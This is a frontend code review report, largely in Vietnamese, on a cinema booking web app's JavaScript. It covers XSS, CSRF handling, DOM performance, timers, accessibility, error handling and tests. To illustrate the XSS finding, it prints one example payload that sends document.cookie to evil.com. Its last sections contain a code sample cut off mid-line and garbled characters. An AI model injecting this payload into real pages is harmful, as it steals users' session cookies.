# Frontend Code Review Report - Cinema Booking System

**Review Date:** 9/6/2026  
**Reviewer:** Senior Software Architect  
**Scope:** JavaScript, CSS, Blade Templates, UX/Accessibility

---

## Executive Summary

Frontend codebase đang trong giai đoạn **chuyển đổi kiến trúc chưa hoàn chỉnh**. Phát hiện hai mô hình JavaScript song song:

1. **Legacy Pattern** (`app.js` - 1850 lines): Global functions, monolithic, không có module structure
2. **Modern Pattern** (`auth.js`, `booking.js`): ES6 classes, encapsulation, separation of concerns

**Mức độ nghiêm trọng:**
- 🔴 Critical: 6 issues (XSS, architecture inconsistency, no error boundaries)
- 🟡 Medium: 8 issues (accessibility gaps, performance, code duplication)
- 🟢 Low: 5 issues (minor improvements)

---

## 1. Architecture & Code Organization

### 🔴 CRITICAL: Inconsistent Architecture Patterns

**Finding:**

Dự án có **hai kiến trúc JavaScript khác nhau đang chạy song song**:

```
Legacy Pattern (app.js):
├── 1850 lines trong 1 file
├── Global functions
├── Global variables (currentUser, selectedSeats, etc.)
├── Mixed concerns
└── No module pattern

Modern Pattern (auth.js, booking.js):
├── ES6 Classes (AuthManager, BookingManager)
├── Encapsulation
├── Constructor dependency injection
├── Private state management
└── Proper separation of concerns
```

**Impact:**
- Khó maintain: 2 patterns khác nhau gây confusion
- Namespace pollution từ app.js
- Code duplication: authentication logic tồn tại ở cả app.js VÀ auth.js
- Testing gần như không thể với global functions

**Evidence:**

`app.js` lines 87-127 có hàm `login()` toàn cục:
```javascript
async function login(e) {
    // ... logic đăng nhập
    persistAuth(data.data);  // Lưu vào sessionStorage
}
```

`auth.js` lines 82-133 có `AuthManager.handleLogin()`:
```javascript
class AuthManager {
    async handleLogin(e) {
        // ... logic đăng nhập
        this.user = response.data.user;  // Lưu vào class property
    }
}
```

Cả hai đều xử lý đăng nhập nhưng theo cách hoàn toàn khác nhau!

**Recommendation:**

**Priority:** 🔴 CRITICAL - Start immediately

1. **Phase 1**: Deprecate toàn bộ `app.js`
   - Tạo file map: function nào cần migrate sang class nào
   - Đánh dấu deprecated với console.warn()

2. **Phase 2**: Extract modules từ app.js
   ```
   app.js (1850 lines) → Split into:
   ├── MovieManager.js (~300 lines)
   ├── TheaterManager.js (~200 lines)
   ├── ShowtimeManager.js (~250 lines)
   ├── OrderManager.js (~300 lines)
   ├── PaymentManager.js (~250 lines)
   ├── AdminDashboard.js (~300 lines)
   └── utils/
       ├── api.js (centralized fetch)
       ├── validation.js
       └── formatting.js
   ```

3. **Phase 3**: Unified API client
   ```javascript
   // services/ApiClient.js
   class ApiClient {
       constructor() {
           this.baseUrl = window.APP_CONFIG?.apiUrl || '/api';
       }
       
       async request(endpoint, options = {}) {
           // Unified fetch với CSRF, auth, refresh token
       }
   }
   ```

---

## 2. Security Issues

### 🔴 CRITICAL: XSS Vulnerabilities in app.js

**Finding:**

`app.js` có nhiều chỗ insert HTML trực tiếp **không sanitize**:

**Evidence 1** - Lines 484-501 (renderMovies):
```javascript
moviesContainer.innerHTML = movies.map(movie => `
    <div class="movie-card">
        <h5>${movie.title}</h5>  // ❌ NO ESCAPING
        <p>${movie.description}</p>  // ❌ NO ESCAPING
    </div>
`).join('');
```

**Evidence 2** - Lines 909-942 (showSeatsSelection):
```javascript
seatsContainer.innerHTML = `
    <div>${seats.map(seat => {
        const label = seat.label || `${seat.row}${seat.column}`;  // ❌ NO ESCAPING
        return `<div>${label}</div>`;
    }).join('')}</div>
`;
```

**Evidence 3** - Lines 1638-1661 (renderUserOrders):
```javascript
ordersList.innerHTML = orders.map(order => `
    <h5>${order.code}</h5>  // ❌ NO ESCAPING
    <div>${movie.title}</div>  // ❌ NO ESCAPING
`).join('');
```

**Potential Attack:**

Nếu admin/attacker tạo phim với title:
```javascript
"<img src=x onerror='fetch(`https://evil.com?cookie=${document.cookie}`)' />"
```

Khi user xem danh sách phim → XSS trigger → cookies bị steal.

**GOOD Practice** trong booking.js:

Lines 485, 631, 633 có sử dụng `escapeHtml()`:
```javascript
<div class="product-name">${this.escapeHtml(product.name)}</div>
```

Method `escapeHtml()` ở line 1325:
```javascript
escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = String(text ?? '');
    return div.innerHTML;
}
```

**Recommendation:**

1. **Immediate fix** - Add escapeHtml to app.js:
   ```javascript
   function escapeHtml(value) {
       const div = document.createElement('div');
       div.textContent = String(value ?? '');
       return div.innerHTML;
   }
   ```

2. **Apply to ALL user-generated content**:
   - movie.title
   - movie.description
   - theater.name
   - order.code
   - user.name
   - promotion.code

3. **Use DOMPurify** for rich content:
   ```html
   <script src="https://cdn.jsdelivr.net/npm/dompurify@3/dist/purify.min.js"></script>
   ```
   ```javascript
   const clean = DOMPurify.sanitize(movie.description);
   ```

4. **Content Security Policy** header:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' cdn.jsdelivr.net
   ```

---

### 🟡 MEDIUM: CSRF Token Handling Inconsistent

**Finding:**

CSRF token handling không đồng nhất giữa các file:

**app.js** - Lines 72-85:
```javascript
function getAuthHeaders(includeBody = true) {
    const headers = {
        'Accept': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.content || ''
    };
    if (includeBody) {
        headers['Content-Type'] = 'application/json';
    }
    return headers;
}
```

**auth.js** - Lines 243-263:
```javascript
async fetchAPI(endpoint, options = {}) {
    const headers = { /* ... */ };
    
    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
    if (csrfToken && (options.method === 'POST' || options.method === 'PUT' || options.method === 'DELETE')) {
        headers['X-CSRF-TOKEN'] = csrfToken;
    }
    // ...
}
```

**booking.js** - Lines 1196-1219:
```javascript
async fetchAPI(endpoint, options = {}) {
    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
    if (csrfToken) {
        headers['X-CSRF-TOKEN'] = csrfToken;
    }
    // ...
}
```

**Issues:**
- Code duplication (3 lần)
- Logic khác nhau: auth.js chỉ add cho POST/PUT/DELETE, booking.js add cho tất cả
- Không có fallback nếu meta tag không tồn tại

**Recommendation:**

Tạo **shared API client**:

```javascript
// services/HttpClient.js
class HttpClient {
    constructor(baseUrl = '/api') {
        this.baseUrl = baseUrl;
    }

    getCsrfToken() {
        return document.querySelector('meta[name="csrf-token"]')?.content || '';
    }

    async request(endpoint, options = {}) {
        const url = `${this.baseUrl}${endpoint}`;
        const headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest'
        };

        // Add CSRF for state-changing methods
        const method = (options.method || 'GET').toUpperCase();
        if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(method)) {
            const csrf = this.getCsrfToken();
            if (!csrf) {
                console.error('CSRF token not found');
            }
            headers['X-CSRF-TOKEN'] = csrf;
        }

        const config = {
            ...options,
            method,
            headers: { ...headers, ...options.headers },
            credentials: 'include'
        };

        const response = await fetch(url, config);
        return await response.json();
    }
}

export default new HttpClient();
```

Sử dụng:
```javascript
import httpClient from './services/HttpClient.js';

const data = await httpClient.request('/movies', {
    method: 'GET'
});
```

---

## 3. Performance Issues

### 🟡 MEDIUM: Excessive DOM Manipulation

**Finding:**

Nhiều functions re-render toàn bộ list thay vì update incremental.

**Evidence 1** - app.js renderMovies (lines 480-501):
```javascript
function renderMovies(movies) {
    moviesContainer.innerHTML = ''; // ❌ Clear all
    moviesContainer.innerHTML = movies.map(/* ... */).join(''); // ❌ Re-create all
}
```

Mỗi lần pagination/filter → clear + re-create **tất cả** movie cards.

**Impact:**
- 50+ movies → 50 DOM elements destroyed + re-created
- Flicker/flash effect
- Lost scroll position
- Event listeners phải re-attach

**Evidence 2** - booking.js renderSeatMap (lines 671-697):
```javascript
renderSeatMap() {
    this.seatMapContainer.innerHTML = ''; // ❌ Clear all seats
    // Re-create all seat elements
}
```

Mỗi lần click 1 ghế → re-render **toàn bộ** seat map (có thể 100+ ghế).

**GOOD Example** - booking.js applyRealtimeSeatStatus (lines 112-154):
```javascript
applyRealtimeSeatStatus(seatId, status) {
    // ✅ Update only ONE seat element
    const seatEl = this.seatMapContainer?.querySelector(`[data-seat-id="${seatId}"]`);
    seatEl.classList.remove('seat-available', 'seat-locked', ...);
    seatEl.classList.add(`seat-${status}`);
}
```

Chỉ update 1 phần tử thay vì re-render all.

**Recommendation:**

1. **Implement incremental updates**:

```javascript
// BAD
function updateMovieList(movies) {
    container.innerHTML = movies.map(renderMovie).join('');
}

// GOOD
function updateMovieList(movies) {
    const existingIds = new Set(
        Array.from(container.children).map(el => el.dataset.movieId)
    );
    
    movies.forEach(movie => {
        if (existingIds.has(String(movie.id))) {
            // Update existing
            const el = container.querySelector(`[data-movie-id="${movie.id}"]`);
            updateMovieElement(el, movie);
        } else {
            // Add new
            container.appendChild(createMovieElement(movie));
        }
    });
    
    // Remove deleted
    existingIds.forEach(id => {
        if (!movies.find(m => m.id === Number(id))) {
            container.querySelector(`[data-movie-id="${id}"]`)?.remove();
        }
    });
}
```

2. **Use DocumentFragment for batch inserts**:

```javascript
function renderSeatMap(seats) {
    const fragment = document.createDocumentFragment();
    
    seats.forEach(seat => {
        fragment.appendChild(createSeatElement(seat));
    });
    
    // Single DOM operation
    this.seatMapContainer.innerHTML = '';
    this.seatMapContainer.appendChild(fragment);
}
```

3. **Consider Virtual DOM library** (Vue.js/React) for complex UIs like seat maps.

---

### 🟡 MEDIUM: Memory Leaks from Timers

**Finding:**

Timers không được cleanup đầy đủ khi user navigate away.

**Evidence** - app.js lines 960-970:
```javascript
function clearSeatHoldTimers() {
    if (seatHoldCountdownTimer) {
        clearInterval(seatHoldCountdownTimer);
        seatHoldCountdownTimer = null;
    }
    if (seatStatusPollingTimer) {
        clearInterval(seatStatusPollingTimer);
        seatStatusPollingTimer = null;
    }
}
```

Function này chỉ được gọi khi:
- Seat hold expires
- User manually unlocks

Nhưng KHÔNG được gọi khi:
- User closes tab → timer vẫn chạy trong background (trước khi page unload)
- User navigate to other page → timer leak

**Impact:**
- Memory leak nếu user open nhiều tabs
- Unnecessary API calls sau khi user rời trang

**GOOD Example** - booking.js line 339-346:
```javascript
window.addEventListener('beforeunload', (e) => {
    if (this.currentHold) {
        navigator.sendBeacon(
            `${this.apiUrl}/seats/unlock/${this.currentHold.hold_id}`,
            JSON.stringify({ _method: 'DELETE' })
        );
    }
});
```

Có cleanup trước khi unload nhưng chưa stop timer.

**Recommendation:**

1. **Add cleanup on page unload**:

```javascript
class BookingManager {
    constructor() {
        // ... existing code
        window.addEventListener('beforeunload', () => this.cleanup());
        
        // For SPA navigation
        if (window.navigation) {
            window.navigation.addEventListener('navigate', () => this.cleanup());
        }
    }
    
    cleanup() {
        this.stopTimer();
        if (this.currentHold) {
            navigator.sendBeacon(
                `${this.apiUrl}/seats/unlock/${this.currentHold.hold_id}`
            );
        }
    }
    
    stopTimer() {
        if (this.timer) {
            clearInterval(this.timer);
            this.timer = null;
        }
    }
}
```

2. **Use Page Visibility API** để pause timers khi tab inactive:

```javascript
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        this.pauseTimer();
    } else {
        this.resumeTimer();
    }
});
```

---

## 4. Accessibility Issues

### 🟡 MEDIUM: Incomplete ARIA Implementation

**Finding:**

Accessibility được implement **một phần** trong booking.js nhưng thiếu ở app.js.

**GOOD** - booking.js lines 752-758:
```javascript
seatDiv.setAttribute('role', 'button');
seatDiv.setAttribute('tabindex', '0');
seatDiv.setAttribute('aria-label', `Ghế ${seat.row}${seat.number}, ${seat.seat_type?.name || 'Thường'}`);
```

**GOOD** - booking.js lines 125-134 (Real-time updates):
```javascript
seatEl.setAttribute('role', 'button');
seatEl.setAttribute('tabindex', '0');
seatEl.removeAttribute('aria-disabled');
```

**MISSING** trong app.js:
- Không có ARIA labels trên dynamic content
- Không có keyboard navigation
- Không có screen reader announcements cho:
  - Movie filter results
  - Seat selection changes
  - Timer countdown
  - Alert messages

**Evidence** - app.js lines 1836-1850 (showAlert):
```javascript
function showAlert(message, type = 'info') {
    const alert = document.createElement('div');
    alert.className = `alert alert-${type}`;
    alert.innerHTML = `<span>${message}</span>`;  // ❌ No role, no aria-live
    document.body.appendChild(alert);
}
```

Screen reader sẽ KHÔNG announce alert này!

**Recommendation:**

1. **Add ARIA live regions**:

```javascript
function showAlert(message, type = 'info') {
    const alert = document.createElement('div');
    alert.className = `alert alert-${type}`;
    alert.setAttribute('role', type === 'danger' ? 'alert' : 'status');
    alert.setAttribute('aria-live', type === 'danger' ? 'assertive' : 'polite');
    alert.setAttribute('aria-atomic', 'true');
    alert.textContent = message;
    document.body.appendChild(alert);
}
```

2. **Announce dynamic changes**:

```javascript
function announceToScreenReader(message) {
    const announcement = document.getElementById('sr-announcements');
    announcement.textContent = message;
}

// Usage
announceToScreenReader(`Đã chọn ghế ${seatLabel}. Tổng ${selectedCount} ghế.`);
```

HTML:
```html
<div id="sr-announcements" class="sr-only" aria-live="polite" aria-atomic="true"></div>
```

3. **Keyboard navigation** cho seat map:

```javascript
seatDiv.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        this.handleSeatClick(seat);
    }
    
    // Arrow key navigation
    if (e.key.startsWith('Arrow')) {
        e.preventDefault();
        this.navigateSeats(e.key, seat);
    }
});
```

4. **Focus management** sau modal close:

```javascript
closeModal() {
    const focusBeforeModal = document.querySelector('[data-focus-return]');
    modal.hide();
    focusBeforeModal?.focus();
}
```

---

## 5. Code Quality

### 🟢 LOW: Missing Input Validation

**Finding:**

Client-side validation không đồng nhất.

**GOOD** - auth.js lines 98-102:
```javascript
if (!data.login || !data.password) {
    this.showAlert('login', 'Vui lòng nhập đầy đủ thông tin');
    return;
}
```

**GOOD** - auth.js lines 160-168:
```javascript
if (data.password !== data.password_confirmation) {
    this.showFieldError('regPasswordConfirmation', 'Mật khẩu xác nhận không khớp');
    return;
}
```

**MISSING** - app.js không có validation cho:
- Email format
- Password strength
- Phone number format
- Promotion code format

**Recommendation:**

Tạo shared validation utilities:

```javascript
// utils/validators.js
export const validators = {
    required: (value, fieldName) => {
        if (!value || String(value).trim() === '') {
            return `${fieldName} là bắt buộc`;
        }
        return null;
    },
    
    email: (value) => {
        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!regex.test(value)) {
            return 'Email không hợp lệ';
        }
        return null;
    },
    
    phone: (value) => {
        const regex = /^(0|\+84)[0-9]{9,10}$/;
        if (!regex.test(value)) {
            return 'Số điện thoại không hợp lệ';
        }
        return null;
    },
    
    password: (value) => {
        if (value.length < 8) {
            return 'Mật khẩu phải có ít nhất 8 ký tự';
        }
        if (!/[A-Z]/.test(value)) {
            return 'Mật khẩu phải có ít nhất 1 chữ hoa';
        }
        if (!/[0-9]/.test(value)) {
            return 'Mật khẩu phải có ít nhất 1 chữ số';
        }
        return null;
    },
    
    match: (value1, value2, fieldName) => {
        if (value1 !== value2) {
            return `${fieldName} không khớp`;
        }
        return null;
    }
};
```

Sử dụng:
```javascript
const errors = [];

errors.push(validators.required(email, 'Email'));
errors.push(validators.email(email));
errors.push(validators.password(password));

const validationErrors = errors.filter(e => e !== null);
if (validationErrors.length > 0) {
    showErrors(validationErrors);
    return;
}
```

---

## 6. Real-time Features

### ✅ EXCELLENT: WebSocket Implementation

**Finding:**

Real-time seat updates được implement **VERY GOOD** trong booking.js.

**Evidence** - Lines 78-106:
```javascript
subscribeToRealtimeChannels() {
    // Public channel - seat status
    window.Echo.channel(`showtime.${showtimeId}`)
        .listen('.seat.status.updated', (event) => {
            this.applyRealtimeSeatStatus(event.seat_id, event.status);
        });
    
    // Private channel - payment result
    window.Echo.private(`order.${orderCode}`)
        .listen('.order.paid', () => {
            this.showSuccessScreen(orderCode);
        });
}
```

**Strengths:**
1. ✅ Public channel cho seat status (không cần auth)
2. ✅ Private channel cho payment (có auth)
3. ✅ Incremental DOM update (không re-render all)
4. ✅ Handle edge case: user's selected seat bị người khác chiếm

**Lines 112-154 - Surgical DOM updates:**
```javascript
applyRealtimeSeatStatus(seatId, status) {
    // Update in-memory data
    const seat = this.seats.find(s => s.id === seatId);
    if (seat) {
        seat.status = status;
    }
    
    // Update single DOM element
    const seatEl = this.seatMapContainer?.querySelector(`[data-seat-id="${seatId}"]`);
    seatEl.classList.remove('seat-available', 'seat-locked', 'seat-booked');
    seatEl.classList.add(`seat-${status}`);
    
    // Handle conflict
    if (this.selectedSeats.has(seatId)) {
        this.selectedSeats.delete(seatId);
        this.showToast('Ghế bạn chọn vừa bị người khác đặt', 'warning');
    }
}
```

**Recommendation:**

Áp dụng pattern này cho các features khác:
- Movie showtime availability real-time
- Order status updates real-time
- Admin dashboard stats real-time

---

## 7. Error Handling

### 🔴 CRITICAL: No Global Error Boundary

**Finding:**

Không có global error handler. Nếu có uncaught error → white screen.

**Evidence:**

Không có code nào bắt:
```javascript
window.addEventListener('error', /* ... */);
window.addEventListener('unhandledrejection', /* ... */);
```

Nếu có lỗi trong BookingManager.init() → page crash hoàn toàn.

**Recommendation:**

1. **Add global error handlers**:

```javascript
// error-handler.js
class ErrorHandler {
    constructor() {
        this.setupGlobalHandlers();
    }
    
    setupGlobalHandlers() {
        window.addEventListener('error', (event) => {
            console.error('Global error:', event.error);
            this.showUserFriendlyError();
            this.reportToSentry(event.error);
        });
        
        window.addEventListener('unhandledrejection', (event) => {
            console.error('Unhandled promise rejection:', event.reason);
            this.showUserFriendlyError();
            this.reportToSentry(event.reason);
        });
    }
    
    showUserFriendlyError() {
        const errorDiv = document.getElementById('global-error');
        if (errorDiv) {
            errorDiv.classList.remove('d-none');
            errorDiv.innerHTML = `
                <div class="alert alert-danger">
                    <h4>Đã xảy ra lỗi</h4>
                    <p>Vui lòng tải lại trang hoặc liên hệ hỗ trợ nếu vấn đề vẫn tiếp diễn.</p>
                    <button onclick="location.reload()">Tải lại trang</button>
                </div>
            `;
        }
    }
    
    reportToSentry(error) {
        if (window.Sentry) {
            Sentry.captureException(error);
        }
    }
}

new ErrorHandler();
```

2. **Try-catch cho initialization**:

```javascript
class BookingManager {
    async init() {
        try {
            await this.loadSeats();
            await this.loadProducts();
            this.subscribeToRealtimeChannels();
        } catch (error) {
            console.error('Initialization failed:', error);
            this.showFallbackUI();
        }
    }
    
    showFallbackUI() {
        document.getElementById('bookingContainer').innerHTML = `
            <div class="alert alert-warning">
                <h4>Không thể tải trang đặt vé</h4>
                <p>Vui lòng thử lại sau hoặc <a href="/">quay lại trang chủ</a>.</p>
            </div>
        `;
    }
}
```

---

## 8. Testing Gaps

### 🟡 MEDIUM: No Frontend Tests

**Finding:**

Không có unit tests, integration tests, hoặc E2E tests cho JavaScript.

**Impact:**
- Refactoring rất rủi ro
- Regression dễ xảy ra
- Không confidence khi deploy

**Recommendation:**

1. **Setup Jest for unit tests**:

```javascript
// __tests__/BookingManager.test.js
import { BookingManager } from '../pages/booking.js';

describe('BookingManager', () => {
    let manager;
    
    beforeEach(() => {
        document.body.innerHTML = `
            <div id="seatMap"></div>
            <div id="totalPrice"></div>
        `;
        manager = new BookingManager();
    });
    
    test('should calculate total price correctly', () => {
        manager.selectedSeats.add(1);
        manager.selectedSeats.add(2);
        manager.basePrice = 100000;
        
        manager.updateSummary();
        
        expect(manager.totalPrice.textContent).toBe('200.000 đ');
    });
    
    test('should limit seat selection to 10', () => {
        for (let i = 1; i <= 11; i++) {
            manager.handleSeatClick({ id: i, status: 'available' });
        }
        
        expect(manager.selectedSeats.size).toBe(10);
    });
});
```

2. **Setup Playwright for E2E tests**:

```javascript
// tests/e2e/booking.spec.js
import { test, expect } from '@playwright/test';

test('user can select seats and proceed to payment', async ({ page }) => {
    await page.goto('/booking?showtime=123');
    
    // Wait for seats to load
    await page.waitForSelector('.seat-available');
    
    // Select 2 seats
    await page.click('.seat[data-seat-id="1"]');
    await page.click('.seat[data-seat-id="2"]');
    
    // Check summary
    await expect(page.locator('#totalPrice')).toContainText('200.000');
    
    // Proceed to payment
    await page.click('#proceedToPaymentBtn');
    
    // Should redirect to payment page
    await expect(page).toHaveURL(/\/payment/);
});
```

3. **Setup Cypress for component tests**:

```javascript
// cypress/component/SeatMap.cy.js
import { mount } from 'cypress/react';
import SeatMap from '../../components/SeatMap';

describe('SeatMap Component', () => {
    it('should render seats correctly', () => {
        const seats = [
            { id: 1, row: 'A', number:
  
## 9. Summary and Action Plan 
 
### Priority Matrix 
 
| Priority | Issue | Impact | Effort | 
|-------|------|--------|--------| 
| ?? P0 | XSS vulnerabilities in app.js | HIGH - Security breach | LOW - Add escapeHtml() | 
| ?? P0 | No global error boundary | HIGH - White screen of death | LOW - Add error handlers | 
| ?? P1 | Inconsistent architecture | HIGH - Maintainability | HIGH - Major refactor | 
| ?? P2 | Memory leaks from timers | MEDIUM - Performance | LOW - Add cleanup | 
| ?? P2 | Excessive DOM manipulation | MEDIUM - Performance | MEDIUM - Optimize renders | 
| ?? P3 | Incomplete accessibility | MEDIUM - UX | MEDIUM - Add ARIA | 
| ?? P3 | No frontend tests | MEDIUM - Quality | HIGH - Setup testing | 

 
### Recommended Action Plan 
 
**Week 1: Security & Critical Fixes** 
- Day 1-2: Add escapeHtml() function to app.js, sanitize all HTML insertions 
- Day 3: Implement global error boundary 
- Day 4-5: Add timer cleanup on page unload, fix memory leaks 
 
**Week 2: Architecture Foundation** 
- Day 1-3: Create shared HttpClient service 
- Day 4-5: Extract utility functions from app.js (formatters, validators) 
 
**Week 3-4: Refactoring** 
- Week 3: Split app.js into separate manager classes 
- Week 4: Add ARIA labels, improve accessibility 
 
**Week 5+: Testing & Optimization** 
- Setup Jest for unit tests 
- Setup Playwright for E2E tests 
- Optimize DOM manipulation patterns 

 
### Positive Highlights 
 
**What's Working Well:** 
 
1. **Modern class-based architecture** in auth.js and booking.js - well-structured, maintainable 
2. **Real-time WebSocket implementation** - excellent pattern with incremental DOM updates 
3. **Security consciousness** in newer code - escapeHtml(), CSRF tokens, HttpOnly cookies 
4. **Accessibility effort** in booking.js - ARIA labels, keyboard support, semantic HTML 
5. **Error handling** in class-based modules - try-catch blocks, user-friendly messages 
6. **Code organization** in page-specific files - separation of concerns 
 
**Key Strengths to Preserve:** 
- BookingManager pattern should be template for refactoring app.js 
- Real-time updates pattern should be expanded to other features 
- HttpOnly cookie-based auth is secure 

 
### Final Conclusion 
 
Frontend codebase c� **n?n t?ng t?t nhung c?n ho�n thi?n refactor**. C�c file m?i nhu `auth.js` v� `booking.js` cho th?y hu?ng di d�ng: class-based, encapsulated, real-time capable, security-aware. Tuy nhi�n `app.js` v?n l� technical debt l?n nh?t v?i 1850 lines monolithic global code. 
 
**Production Readiness:** ?? PARTIALLY READY 
 
**Must fix before production:** 
1. Sanitize all dynamic HTML insertions in app.js 
2. Add global error boundary 
3. Add cleanup for timers and WebSocket subscriptions 
4. Ensure only one auth flow is active (remove duplicate app.js auth or auth.js conflict) 
 
**Recommended direction:** 
Refactor theo pattern `BookingManager`: class-based modules, shared HttpClient, explicit state management, incremental DOM updates, and full test coverage. 
 
--- 
 
**Review completed:** Frontend JavaScript architecture, security, performance, accessibility, and testing strategy. 

